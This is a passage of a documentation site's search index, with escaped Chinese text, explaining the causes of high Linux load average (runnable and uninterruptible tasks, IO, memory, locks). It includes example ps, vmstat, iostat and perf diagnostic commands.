\u98d9\u9ad8\u7684\u539f\u56e0\uff0c\u8bf4\u7b80\u5355\u4e5f\u7b80\u5355\uff0c\u65e0\u975e\u5c31\u662frunning+runnable \u6216\u8005 uninterruptible \u7684task \u589e\u591a\u4e86\u3002\u4f46\u662f\u8bf4\u590d\u6742\u4e5f\u590d\u6742\uff0c\u56e0\u4e3a\u5bfc\u81f4task\u8fdb\u5165uninterruptible\u72b6\u6001\u7684\u8def\u5f84\u975e\u5e38\u591a R\u591a\u5bfc\u81f4load\u98d9\u9ad8 \u901a\u8fc7vmstat\u4f1a\u53d1\u73b0r\u8fd9\u4e00\u5217\u7684\u6570\u503c\u4f1a\u98d9\u9ad8\uff0c\u8bc1\u660e\u5927\u91cf\u7ebf\u7a0brunning\u6216\u8005runnable \u901a\u8fc7ps\u547d\u4ee4\u53ef\u4ee5\u67e5\u8be2\u4ec0\u4e48\u7a0b\u5e8f\u6709\u591a\u4e2aR\u548cD\uff0c\u7136\u540e\u901a\u8fc7perf \u8c03\u67e5\u7a0b\u5e8f\u4e3a\u4ec0\u4e48\u4f1a\u6709\u90a3\u4e48\u591aR\u7684\u95ee\u9898\u3002\u901a\u5e38\u662f\u7531\u4e8e\u4e1a\u52a1\u91cf\u7684\u589e\u52a0\u5bfc\u81f4\u7684\uff0c\u5c5e\u4e8e\u6b63\u5e38\u73b0\u8c61\uff0c\u4f46\u4e5f\u6709\u662f\u4e1a\u52a1\u4ee3\u7801bug\u5bfc\u81f4\u7684\uff0c\u6bd4\u5982\u957f\u5faa\u73af\u751a\u81f3\u6b7b\u5faa\u73af $ ps -e -L h o state,pid,ppid,ucmd:30,cmd:100,wchan:30 |awk '{if($1==\"R\"||$1==\"D\"){print $0}}' | sort | uniq -c 9 R 5082 2828 sysbench sysbench --threads=20 --max-time=300 threads run - 1 R 5082 2828 sysbench sysbench --threads=20 --max-time=300 threads run futex_wait_queue_me 1 R 5115 1861 ps ps -e -L h o state,pid,ppid,ucmd:30,cmd:100,wchan:30 - 1 R 5116 1861 awk awk {if($1==\"R\"||$1==\"D\"){print $0}} - 1 R 9 2 rcu_sched [rcu_sched] D\u591a\u5bfc\u81f4load\u98d9\u9ad8 IO\u539f\u56e0 \u901a\u8fc7vmstat\u4f1a\u53d1\u73b0b\u8fd9\u4e00\u5217\u7684\u6570\u503c\u4f1a\u98d9\u9ad8\uff0c\u8bc1\u660e\u5927\u91cf\u7ebf\u7a0b\u56e0\u4e3a\u7b49\u5f85IO\u800c\u5904\u4e8eD\u72b6\u6001\u3002 $ vmstat -wt 1 procs -----------------------memory---------------------- ---swap-- -----io---- -system-- --------cpu-------- -----timestamp----- r b swpd free buff cache si so bi bo in cs us sy id wa st CST 1 28 0 983824 187652 2400824 0 0 0 5 3 1 10 20 0 70 0 2022-05-21 20:10:06 \u901a\u8fc7iostat -xt 1 \u53ef\u4ee5\u67e5\u770b\u78c1\u76d8\u7684await\u4f1a\u98d9\u9ad8 $ iostat -xt 1 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-20-centos) 05/21/2022 _x86_64_ (2 CPU) Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %util vda 0.00 0.62 0.02 1.55 0.65 10.18 13.83 0.00 999.4 0.10 999.3 0.35 0.06 vdb 0.00 0.00 0.00 0.00 0.00 0.00 48.89 0.00 0.45 0.45 0.00 0.33 0.00 \u5185\u5b58\u539f\u56e0 task \u5728\u7533\u8bf7\u5185\u5b58\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4f1a\u89e6\u53d1\u5185\u5b58\u56de\u6536\uff0c\u5982\u679c\u89e6\u53d1\u7684\u662f\u76f4\u63a5\u5185\u5b58\u56de\u6536\uff0c\u90a3\u5bf9\u6027\u80fd\u7684\u4f24\u5bb3\u5f88\u5927\u3002\u5f53\u524dtask \u4f1a\u88ab\u963b\u585e\u76f4\u5230\u5185\u5b58\u56de\u6536\u5b8c\u6210\u3002\u4e00\u822c\u8fd9\u79cd\u53ea\u662f\u6682\u65f6 \u56e0\u4e3a\u5185\u5b58\u7684\u5206\u914d\u662f\u4ee5\u9875\u8fdb\u884c\u5206\u914d\uff0c\u6709\u7684\u65f6\u5019\uff0c\u6709\u7684\u7a0b\u5e8f\u9700\u8981\u67d0\u4e2a\u5927\u5c0f\u7684\u9875\u7684\u5185\u5b58\u6216\u8005\u8fde\u7eed\u7684\u5185\u5b58\u7a7a\u95f4\u6ca1\u6709\uff0c\u5bfc\u81f4\u5206\u914d\u5185\u5b58\u7684\u7cfb\u7edf\u8c03\u7528\u5904\u4e8eD\u72b6\u6001\uff0c\u540e\u7eed\u7684\u5185\u5b58\u7533\u8bf7\u90fd\u4e0d\u80fd\u5b8c\u6210\uff0c\u5bfc\u81f4\u5927\u91cf\u7ebf\u7a0b\u5904\u4e8eD\u72b6\u6001\u7b49\u5f85\uff0c\u4ece\u800cload\u9ad8 \u7f51\u7edc\u539f\u56e0 \u5982\u679c\u7f51\u5361\u7684\u5927\u91cf\u7684\u4e22\u5305\u6216\u8005\u91cd\u4f20\uff0c\u5c31\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u5904\u4e8eD\u72b6\u6001\uff0c\u5982\u679cD\u72b6\u6001\u8fdb\u7a0b\u592a\u591a\uff0c\u5c31\u4f1a\u5bfc\u81f4load\u9ad8 \u9501 \u4e00\u822c\u8fd9\u79cd\u60c5\u51b5\uff0c\u901a\u8fc7vmstat\u67e5\u770b\u7cfb\u7edf\u53ef\u4ee5r\u548cb\u90fd\u975e\u5e38\u5c11\uff0c\u4f46\u662f\u901a\u8fc7ps\u547d\u4ee4\u67e5\u8be2D\u72b6\u6001\u7684\u8fdb\u7a0b\u975e\u5e38\u591a $ vmstat -wt 1 procs -----------------------memory---------------------- ---swap-- -----io---- -system-- --------cpu-------- -----timestamp----- r b swpd free buff cache si so bi bo in cs us sy id wa st CST 1 0 0 983824 187652 2400824 0 0 0 5 3 1 0 0 100 0 0 2022-05-21 20:10:06 $ ps -e -L h o state,pid,ppid,ucmd:30,cmd:100,wchan:30 |awk '{if($1==\"R\"||$1==\"D\"){print $0}}' | sort | uniq -c 99 D 5082 2828 sysbench sysbench --threads=20 --max-time=300 threads run futex_wait_queue_me \u5f53\u67d0\u4e9b\u7a0b\u5e8f\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u65f6\u3002\u8be5\u7cfb\u7edf\u8c03\u7528\u5904\u4e8e\u6b7b\u9501\u72b6\u6001\uff0c\u540e\u7eed\u7684\u7a0b\u5e8f\u53ea\u8981\u8fd0\u884c\u8be5\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u5c31\u4f1a\u8ba9\u7a0b\u5e8f\u5904\u4e8eD\u72b6\u6001\uff0c\u9020\u6210\u5927\u91cf\u8fdb\u7a0b\u5904\u4e8eD\u72b6\u6001\uff0c\u4ece\u800cLOAD\u9ad8 \u8fd9\u79cd\u5c31\u6bd4\u8f83\u68d8\u624b\uff0c\u901a\u8fc7\u4e0a\u9762\u7684PS\u547d\u4ee4\u67e5\u8be2\u5904\u4e8eD\u72b6\u6001\u7684\u8fdb\u7a0b\u6267\u884c\u7684wchan\uff0c\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u6267\u884c\u54ea\u4e9b\u7cfb\u7edf\u8c03\u7528\u8fdb\u5165\u4e86\u6b7b\u9501\u72b6\u6001\uff0c\u4e5f\u53ef\u4ee5\u67e5\u770b/proc/${pid}/stat \u4ee5\u53ca/proc/${pid}/task/${pid}/stat \u6587\u4ef6 \u67e5\u770b\u8fdb\u7a0b\u5728\u54ea\u4e9b\u7cfb\u7edf\u8c03\u7528\u8fdb\u5165\u4e86\u6b7b\u9501\u72b6\u6001\u3002\u5373\u4f7f\u77e5\u9053\u54ea\u4e2a\u7cfb\u7edf\u8c03\u7528\u8fdb\u5165\u6b7b\u9501\uff0c\u4f46\u662f\u4e5f\u4e0d\u77e5\u9053\u54ea\u4e2a\u7a0b\u5e8f\u5bfc\u81f4\u8be5\u7cfb\u7edf\u8c03\u7528\u7b2c\u4e00\u4e2a\u8fdb\u5165\u6b7b\u9501\u72b6\u6001\u7684\uff0c\u6240\u4ee5\u9700\u8981\u5f00\u53d1\u4e13\u7528\u7684\u8ffd\u8e2a\u5185\u6838\u7a0b\u5e8f\u6765\u5206\u6790 https://baijiahao.baidu.com/s?id=1719292352009888378&wfr=spider&for=pc https://www.isolves.com/it/rj/czxt/linux/2019-08-22/3631.html","title":"load\u9ad8\u7684\u539f\u56e0"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/load%E9%AB%98%E7%9A%84%E5%8E%9F%E5%9B%A0/#load","text":"","title":"load\u9ad8\u7684\u539f\u56e0"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/load%E9%AB%98%E7%9A%84%E5%8E%9F%E5%9B%A0/#_1","text":"\u5176\u5b9eLinux\u662f\u4e0d\u533a\u5206\u7ebf\u7a0b\u548c\u8fdb\u7a0b\u7684\uff0c\u5728Linux\u773c\u91cc\u90fd\u662f\u8fdb\u7a0b\uff0cLinux\u4e3a\u4e86\u5b8c\u6210\u5bf9\u7ebf\u7a0b\u7684POSIX\u6807\u51c6\uff0c\u5f15\u5165\u4e86LWP\uff0c\u5c31\u662f\u8f7b\u91cf\u7ea7\u8fdb\u7a0b\uff0c\u5373\u6211\u4eec\u773c\u4e2d\u7684\u7ebf\u7a0b\uff0c\u7ebf\u7a0b\u548c\u8fdb\u7a0b\u7684\u521b\u5efa\u65b9\u6cd5\u5728\u5e95\u5c42\u662f\u76f8\u540c\u7684\uff0c\u90fd\u662f\u8c03\u7528do_fork()\u65b9\u6cd5\uff0c\u53ea\u662f\u4f20\u53c2\u4e0d\u540c\u3002\u5c31\u56e0\u4e3a\u8fd9\u4e2a\u4f7f\u5f97\u7ebf\u7a0b\u548c\u8fdb\u7a0b\u7684\u6982\u5ff5\u6df7\u6dc6\u4e86\uff0c\u6709\u4eba\u8bf4\u7cfb\u7edf\u8c03\u5ea6\u5355\u4f4d\u662f\u8fdb\u7a0b\uff0c\u53c8\u6709\u4eba\u8bf4\u662f\u7ebf\u7a0b\uff0c\u5176\u5b9e\u7cfb\u7edf\u8c03\u5ea6\u7684\u5355\u4f4d\u4e00\u76f4\u5c31\u6ca1\u6709\u6539\u53d8\uff0c\u53ea\u662f\u540e\u6765\u90e8\u5206\u7ebf\u7a0b\u548c\u8fdb\u7a0b\u7684\u754c\u9650\u6a21\u7cca\u4e86 \u67e5\u770b\u7cfb\u7edf\u6240\u6709\u7684LWP\u548c\u666e\u901a\u8fdb\u7a0b\uff1a $ ps -ALFlf \u67e5\u770b\u7cfb\u7edf\u4e2d\u6240\u6709\u7684\u666e\u901a\u8fdb\u7a0b\uff1a $ ps -ef \u4e0b\u9762\u8bf4\u7684\u8fdb\u7a0b\u90fd\u662f\u8bf4\u666e\u901a\u8fdb\u7a0b+LWP \u7b80\u5355\u6765\u8bf4\uff0c\u5e73\u5747\u8d1f\u8f7d\u662f\u6307\u5355\u4f4d\u65f6\u95f4\u5185\uff0c\u7cfb\u7edf\u5904\u4e8e\u6b63\u5728\u8fd0\u884c\u3001\u53ef\u8fd0\u884c\u72b6\u6001\u548c\u4e0d\u53ef\u4e2d\u65ad\u72b6\u6001\u7684\u5e73\u5747\u8fdb\u7a0b\uff08\u666e\u901a\u8fdb\u7a0b+LWP\uff09\u6570\uff0c\u5b83\u548c CPU \u4f7f\u7528\u7387\u5e76\u6ca1\u6709\u76f4\u63a5\u5173\u7cfb\u3002 \u518d\u7b80\u5355\u53ef\u4ee5\u628aload\u770b\u6210 \uff08\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u6570+\u4e0d\u53ef\u4e2d\u65ad\u72b6\u6001\u7684\u8fdb\u7a0b\u6570+\u4e0d\u53ef\u4e2d\u65ad\u72b6\u6001\u8fdb\u7a0b\u6570\uff09 \u6216\u8005\u628a load\u770b\u6210 \uff08R\u72b6\u6001\u7684\u8fdb\u7a0b+D\u72b6\u6001\u7684\u8fdb\u7a0b\uff09 \uff0c\u8fd9\u53ea\u662f\u7b80\u5355\u7684\u6765\u8bf4\uff0c\u5176\u5b9eload\u662f\u4e2a\u62df\u5408\u503c\uff0c\u5176\u4e2d\u6570\u5b66\u7b97\u6cd5\u6bd4\u8f83\u590d\u6742\uff0c\u5177\u4f53\u7684\u8ba1\u7b97\u65b9\u6cd5\u5728\u5982\u4e0b\u4ee3\u7801\u4e2d\u3002 load\u6570\u503c\u7684\u8ba1\u7b97\u4ee3\u7801\u4e3a\uff1ahttps://github.com/torvalds/linux/blob/master/fs/proc/loadavg.c \u67e5\u770b\u7cfb\u7edf\u7684load\u503c $ cat /proc/loadavg 0.06 0.04 0.05 1/170 4087 #\u524d\u4e09\u4e2a\u503c\u4e3a\u663e\u793a\u6700\u8fd11\u5206\u949f\uff0c5\u5206\u949f\uff0c15\u5206\u949f\u7684load\u503c #\u7b2c\u56db\u4e2a\u6570\u5b57\u4e3a\uff0c\u5206\u5b50\u4e3a\u5f53\u524d\u5904\u4e8eR\u72b6\u6001\u7ebf\u7a0b\u6570\u91cf\uff0c\u5206\u6bcd\u4e3a\u5f53\u524d\u7cfb\u7edf\u4e2d\u6709\u591a\u5c11\u4e2aLWP #\u7b2c\u4e94\u4e2a\u6570\u5b57\u4e3a\uff0c\u6700\u65b0\u521b\u5efa\u51fa\u6765\u7684PID\u4e3a\u591a\u5c11 \u4e00\u822cload\u6570\u5b57\u5728CPU\u7684\u903b\u8f91\u4e2a\u6570\u7684\u4e8c\u500d\u4ee5\u4e0b\u4e3a\u6b63\u5e38\u503c \u5904\u4e8e R \u72b6\u6001\uff08Running \u6216 Runnable\uff09\u7684\u8fdb\u7a0b\u662f\u6307 \u6b63\u5728\u8fd0\u884c \u6216\u8005 \u53ef\u8fd0\u884c\u5e76\u7b49\u5f85CPU\u6267\u884c \u7684\u8fdb\u7a0b\uff0c ps -ALFlf \u547d\u4ee4\u5728\u7b2c\u4e8c\u5217 S \u4e00\u5217\u4e2d\u663e\u793a R \u72b6\u6001\u7684\u8fdb\u7a0b \u5904\u4e8eD \u72b6\u6001\uff08Uninterruptible Sleep\uff0c\u4e5f\u79f0\u4e3a Disk Sleep\uff09\u7684\u8fdb\u7a0b\u662f\u6307 \u4e0d\u53ef\u4e2d\u65ad\u72b6\u6001 \u7684\u8fdb\u7a0b\uff0c\u8fd9\u4e9b\u8fdb\u7a0b\u4e0d\u53ef\u6253\u65ad\u7684\u3002\u6bd4\u5982\u6700\u5e38\u89c1\u7684\u662f\u7b49\u5f85\u786c\u4ef6\u8bbe\u5907\u7684 I/O \u54cd\u5e94\uff0c\u6216\u8005\u6267\u884c\u67d0\u4e9b\u5173\u952e\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u6216\u8005\u8fdb\u5165\u9501\u72b6\u6001\uff0c\u90fd\u662f\u4f1a\u5904\u4e8eD\u72b6\u6001 \u4ece\u4e0a\u8ff0load\u7684\u8ba1\u7b97\u539f\u7406\u53ef\u4ee5\u770b\u51fa\uff0c\u5bfc\u81f4load \u98d9\u9ad8\u7684\u539f\u56e0\uff0c\u8bf4\u7b80\u5355\u4e5f\u7b80\u5355\uff0c\u65e0\u975e\u5c31\u662frunning+runnable \u6216\u8005 uninterruptible \u7684task \u589e\u591a\u4e86\u3002\u4f46\u662f\u8bf4\u590d\u6742\u4e5f\u590d\u6742\uff0c\u56e0\u4e3a\u5bfc\u81f4task\u8fdb\u5165uninterruptible\u72b6\u6001\u7684\u8def\u5f84\u975e\u5e38\u591a","title":"\u524d\u8a00"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/load%E9%AB%98%E7%9A%84%E5%8E%9F%E5%9B%A0/#rload","text":"\u901a\u8fc7vmstat\u4f1a\u53d1\u73b0r\u8fd9\u4e00\u5217\u7684\u6570\u503c\u4f1a\u98d9\u9ad8\uff0c\u8bc1\u660e\u5927\u91cf\u7ebf\u7a0brunning\u6216\u8005runnable \u901a\u8fc7ps\u547d\u4ee4\u53ef\u4ee5\u67e5\u8be2\u4ec0\u4e48\u7a0b\u5e8f\u6709\u591a\u4e2aR\u548cD\uff0c\u7136\u540e\u901a\u8fc7perf \u8c03\u67e5\u7a0b\u5e8f\u4e3a\u4ec0\u4e48\u4f1a\u6709\u90a3\u4e48\u591aR\u7684\u95ee\u9898\u3002\u901a\u5e38\u662f\u7531\u4e8e\u4e1a\u52a1\u91cf\u7684\u589e\u52a0\u5bfc\u81f4\u7684\uff0c\u5c5e\u4e8e\u6b63\u5e38\u73b0\u8c61\uff0c\u4f46\u4e5f\u6709\u662f\u4e1a\u52a1\u4ee3\u7801bug\u5bfc\u81f4\u7684\uff0c\u6bd4\u5982\u957f\u5faa\u73af\u751a\u81f3\u6b7b\u5faa\u73af $ ps -e -L h o state,pid,ppid,ucmd:30,cmd:100,wchan:30 |awk '{if($1==\"R\"||$1==\"D\"){print $0}}' | sort | uniq -c 9 R 5082 2828 sysbench sysbench --threads=20 --max-time=300 threads run - 1 R 5082 2828 sysbench sysbench --threads=20 --max-time=300 threads run futex_wait_queue_me 1 R 5115 1861 ps ps -e -L h o state,pid,ppid,ucmd:30,cmd:100,wchan:30 - 1 R 5116 1861 awk awk {if($1==\"R\"||$1==\"D\"){print $0}} - 1 R 9 2 rcu_sched [rcu_sched]","title":"R\u591a\u5bfc\u81f4load\u98d9\u9ad8"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/load%E9%AB%98%E7%9A%84%E5%8E%9F%E5%9B%A0/#dload","text":"","title":"D\u591a\u5bfc\u81f4load\u98d9\u9ad8"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/load%E9%AB%98%E7%9A%84%E5%8E%9F%E5%9B%A0/#io","text":"\u901a\u8fc7vmstat\u4f1a\u53d1\u73b0b\u8fd9\u4e00\u5217\u7684\u6570\u503c\u4f1a\u98d9\u9ad8\uff0c\u8bc1\u660e\u5927\u91cf\u7ebf\u7a0b\u56e0\u4e3a\u7b49\u5f85IO\u800c\u5904\u4e8eD\u72b6\u6001\u3002 $ vmstat -wt 1 procs -----------------------memory---------------------- ---swap-- -----io---- -system-- --------cpu-------- -----timestamp----- r b swpd free buff cache si so bi bo in cs us sy id wa st CST 1 28 0 983824 187652 2400824 0 0 0 5 3 1 10 20 0 70 0 2022-05-21 20:10:06 \u901a\u8fc7iostat -xt 1 \u53ef\u4ee5\u67e5\u770b\u78c1\u76d8\u7684await\u4f1a\u98d9\u9ad8 $ iostat -xt 1 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-20-centos) 05/21/2022 _x86_64_ (2 CPU) Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %util vda 0.00 0.62 0.02 1.55 0.65 10.18 13.83 0.00 999.4 0.10 999.3 0.35 0.06 vdb 0.00 0.00 0.00 0.00 0.00 0.00 48.89 0.00 0.45 0.45 0.00 0.33 0.00","title":"IO\u539f\u56e0"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/load%E9%AB%98%E7%9A%84%E5%8E%9F%E5%9B%A0/#_2","text":"task \u5728\u7533\u8bf7\u5185\u5b58\u7684\u65f6\u5019\uff0c\u53ef\u80fd\u4f1a\u89e6\u53d1\u5185\u5b58\u56de\u6536\uff0c\u5982\u679c\u89e6\u53d1\u7684\u662f\u76f4\u63a5\u5185\u5b58\u56de\u6536\uff0c\u90a3\u5bf9\u6027\u80fd\u7684\u4f24\u5bb3\u5f88\u5927\u3002\u5f53\u524dtask \u4f1a\u88ab\u963b\u585e\u76f4\u5230\u5185\u5b58\u56de\u6536\u5b8c\u6210\u3002\u4e00\u822c\u8fd9\u79cd\u53ea\u662f\u6682\u65f6 \u56e0\u4e3a\u5185\u5b58\u7684\u5206\u914d\u662f\u4ee5\u9875\u8fdb\u884c\u5206\u914d\uff0c\u6709\u7684\u65f6\u5019\uff0c\u6709\u7684\u7a0b\u5e8f\u9700\u8981\u67d0\u4e2a\u5927\u5c0f\u7684\u9875\u7684\u5185\u5b58\u6216\u8005\u8fde\u7eed\u7684\u5185\u5b58\u7a7a\u95f4\u6ca1\u6709\uff0c\u5bfc\u81f4\u5206\u914d\u5185\u5b58\u7684\u7cfb\u7edf\u8c03\u7528\u5904\u4e8eD\u72b6\u6001\uff0c\u540e\u7eed\u7684\u5185\u5b58\u7533\u8bf7\u90fd\u4e0d\u80fd\u5b8c\u6210\uff0c\u5bfc\u81f4\u5927\u91cf\u7ebf\u7a0b\u5904\u4e8eD\u72b6\u6001\u7b49\u5f85\uff0c\u4ece\u800cload\u9ad8","title":"\u5185\u5b58\u539f\u56e0"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/load%E9%AB%98%E7%9A%84%E5%8E%9F%E5%9B%A0/#_3","text":"\u5982\u679c\u7f51\u5361\u7684\u5927\u91cf\u7684\u4e22\u5305\u6216\u8005\u91cd\u4f20\uff0c\u5c31\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u5904\u4e8eD\u72b6\u6001\uff0c\u5982\u679cD\u72b6\u6001\u8fdb\u7a0b\u592a\u591a\uff0c\u5c31\u4f1a\u5bfc\u81f4load\u9ad8","title":"\u7f51\u7edc\u539f\u56e0"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/load%E9%AB%98%E7%9A%84%E5%8E%9F%E5%9B%A0/#_4","text":"\u4e00\u822c\u8fd9\u79cd\u60c5\u51b5\uff0c\u901a\u8fc7vmstat\u67e5\u770b\u7cfb\u7edf\u53ef\u4ee5r\u548cb\u90fd\u975e\u5e38\u5c11\uff0c\u4f46\u662f\u901a\u8fc7ps\u547d\u4ee4\u67e5\u8be2D\u72b6\u6001\u7684\u8fdb\u7a0b\u975e\u5e38\u591a $ vmstat -wt 1 procs -----------------------memory---------------------- ---swap-- -----io---- -system-- --------cpu-------- -----timestamp----- r b swpd free buff cache si so bi bo in cs us sy id wa st CST 1 0 0 983824 187652 2400824 0 0 0 5 3 1 0 0 100 0 0 2022-05-21 20:10:06 $ ps -e -L h o state,pid,ppid,ucmd:30,cmd:100,wchan:30 |awk '{if($1==\"R\"||$1==\"D\"){print $0}}' | sort | uniq -c 99 D 5082 2828 sysbench sysbench --threads=20 --max-time=300 threads run futex_wait_queue_me \u5f53\u67d0\u4e9b\u7a0b\u5e8f\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u65f6\u3002\u8be5\u7cfb\u7edf\u8c03\u7528\u5904\u4e8e\u6b7b\u9501\u72b6\u6001\uff0c\u540e\u7eed\u7684\u7a0b\u5e8f\u53ea\u8981\u8fd0\u884c\u8be5\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u5c31\u4f1a\u8ba9\u7a0b\u5e8f\u5904\u4e8eD\u72b6\u6001\uff0c\u9020\u6210\u5927\u91cf\u8fdb\u7a0b\u5904\u4e8eD\u72b6\u6001\uff0c\u4ece\u800cLOAD\u9ad8 \u8fd9\u79cd\u5c31\u6bd4\u8f83\u68d8\u624b\uff0c\u901a\u8fc7\u4e0a\u9762\u7684PS\u547d\u4ee4\u67e5\u8be2\u5904\u4e8eD\u72b6\u6001\u7684\u8fdb\u7a0b\u6267\u884c\u7684wchan\uff0c\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u6267\u884c\u54ea\u4e9b\u7cfb\u7edf\u8c03\u7528\u8fdb\u5165\u4e86\u6b7b\u9501\u72b6\u6001\uff0c\u4e5f\u53ef\u4ee5\u67e5\u770b/proc/${pid}/stat \u4ee5\u53ca/proc/${pid}/task/${pid}/stat \u6587\u4ef6 \u67e5\u770b\u8fdb\u7a0b\u5728\u54ea\u4e9b\u7cfb\u7edf\u8c03\u7528\u8fdb\u5165\u4e86\u6b7b\u9501\u72b6\u6001\u3002\u5373\u4f7f\u77e5\u9053\u54ea\u4e2a\u7cfb\u7edf\u8c03\u7528\u8fdb\u5165\u6b7b\u9501\uff0c\u4f46\u662f\u4e5f\u4e0d\u77e5\u9053\u54ea\u4e2a\u7a0b\u5e8f\u5bfc\u81f4\u8be5\u7cfb\u7edf\u8c03\u7528\u7b2c\u4e00\u4e2a\u8fdb\u5165\u6b7b\u9501\u72b6\u6001\u7684\uff0c\u6240\u4ee5\u9700\u8981\u5f00\u53d1\u4e13\u7528\u7684\u8ffd\u8e2a\u5185\u6838\u7a0b\u5e8f\u6765\u5206\u6790 https://baijiahao.baidu.com/s?id=1719292352009888378&wfr=spider&for=pc https://www.isolves.com/it/rj/czxt/linux/2019-08-22/3631.html","title":"\u9501"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/perf/","text":"perf\u547d\u4ee4 perf \u662f\u4e00\u4e2aLinux\u7cfb\u7edf\u4e2d\u7684\u6027\u80fd\u5206\u6790\u5de5\u5177\uff0c\u5b83\u652f\u6301\u786c\u4ef6\u6027\u80fd\u8ba1\u6570\u3001\u8f6f\u4ef6\u6027\u80fd\u8ba1\u6570\u548c\u52a8\u6001\u4fa6\u6d4b\u3002 perf stat : \u6d4b\u91cf\u8fd0\u884c\u5355\u4e2a\u7a0b\u5e8f\u6216\u662f\u7cfb\u7edf\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\u5185\u7684\u6027\u80fd\u8ba1\u6570 perf top : \u52a8\u6001\u67e5\u770b\u5f53\u524d\u7cfb\u7edf\u7684\u70ed\u70b9\u51fd\u6570 perf record : \u6d4b\u91cf\u548c\u4fdd\u5b58\u5355\u4e2a\u7a0b\u5e8f\u7684\u91c7\u6837\u6570\u636e perf report : \u5206\u6790\u7531perf record\u4ea7\u751f\u7684\u6570\u636e\u6587\u4ef6 perf list : \u5217\u4e3e\u51faperf\u652f\u6301\u7684\u6027\u80fd\u8ba1\u6570\u4e8b\u4ef6 $ mkdir test $ cd test $ perf record -g -a # -a \u6536\u96c6\u6240\u6709CPU -g\u5f00\u542f\u8c03\u7528\u5173\u7cfb\u5206\u6790 $ ll total 5624 -rw------- 1 root root 5755668 Apr 13 16:49 perf.data $ perf report #\u67e5\u770b\u62a5\u544a # -g\u5f00\u542f\u8c03\u7528\u5173\u7cfb\u5206\u6790\uff0c-p\u6307\u5b9aphp-fpm\u7684\u8fdb\u7a0b\u53f721515 $ perf top -g -p 21515 \u6309\u65b9\u5411\u952e\u5207\u6362\u5230 php-fpm\uff0c\u518d\u6309\u4e0b\u56de\u8f66\u952e\u5c55\u5f00 php-fpm \u7684\u8c03\u7528\u5173\u7cfb\uff0c\u4f60\u4f1a\u53d1\u73b0\uff0c\u8c03\u7528\u5173\u7cfb\u6700\u7ec8\u5230\u4e86 sqrt \u548c add_function\u3002 \u76f8\u5173\u94fe\u63a5\uff1a https://www.brendangregg.com/perf.html https://perf.wiki.kernel.org/index.php/Tutorial https://zh.wikipedia.org/wiki/Perf https://man7.org/linux/man-pages/man1/perf.1.html","title":"perf\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/perf/#perf","text":"perf \u662f\u4e00\u4e2aLinux\u7cfb\u7edf\u4e2d\u7684\u6027\u80fd\u5206\u6790\u5de5\u5177\uff0c\u5b83\u652f\u6301\u786c\u4ef6\u6027\u80fd\u8ba1\u6570\u3001\u8f6f\u4ef6\u6027\u80fd\u8ba1\u6570\u548c\u52a8\u6001\u4fa6\u6d4b\u3002 perf stat : \u6d4b\u91cf\u8fd0\u884c\u5355\u4e2a\u7a0b\u5e8f\u6216\u662f\u7cfb\u7edf\u8fd0\u884c\u4e00\u6bb5\u65f6\u95f4\u5185\u7684\u6027\u80fd\u8ba1\u6570 perf top : \u52a8\u6001\u67e5\u770b\u5f53\u524d\u7cfb\u7edf\u7684\u70ed\u70b9\u51fd\u6570 perf record : \u6d4b\u91cf\u548c\u4fdd\u5b58\u5355\u4e2a\u7a0b\u5e8f\u7684\u91c7\u6837\u6570\u636e perf report : \u5206\u6790\u7531perf record\u4ea7\u751f\u7684\u6570\u636e\u6587\u4ef6 perf list : \u5217\u4e3e\u51faperf\u652f\u6301\u7684\u6027\u80fd\u8ba1\u6570\u4e8b\u4ef6 $ mkdir test $ cd test $ perf record -g -a # -a \u6536\u96c6\u6240\u6709CPU -g\u5f00\u542f\u8c03\u7528\u5173\u7cfb\u5206\u6790 $ ll total 5624 -rw------- 1 root root 5755668 Apr 13 16:49 perf.data $ perf report #\u67e5\u770b\u62a5\u544a # -g\u5f00\u542f\u8c03\u7528\u5173\u7cfb\u5206\u6790\uff0c-p\u6307\u5b9aphp-fpm\u7684\u8fdb\u7a0b\u53f721515 $ perf top -g -p 21515 \u6309\u65b9\u5411\u952e\u5207\u6362\u5230 php-fpm\uff0c\u518d\u6309\u4e0b\u56de\u8f66\u952e\u5c55\u5f00 php-fpm \u7684\u8c03\u7528\u5173\u7cfb\uff0c\u4f60\u4f1a\u53d1\u73b0\uff0c\u8c03\u7528\u5173\u7cfb\u6700\u7ec8\u5230\u4e86 sqrt \u548c add_function\u3002 \u76f8\u5173\u94fe\u63a5\uff1a https://www.brendangregg.com/perf.html https://perf.wiki.kernel.org/index.php/Tutorial https://zh.wikipedia.org/wiki/Perf https://man7.org/linux/man-pages/man1/perf.1.html","title":"perf\u547d\u4ee4"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/pidstat/","text":"pidstat \u8bed\u6cd5 pidstat [ options ] [ <interval> [ <count> ] ] \u529f\u80fd \u62a5\u544a Linux \u4efb\u52a1\u7684\u7edf\u8ba1\u4fe1\u606f\u3002pidstat\u547d\u4ee4\u7528\u4e8e\u76d1\u63a7\u5355\u4e2a\u4efb\u52a1\uff0c\u76ee\u524d\u7531 Linux \u5185\u6838\u7ba1\u7406\u3002 \u9009\u9879 -C comm 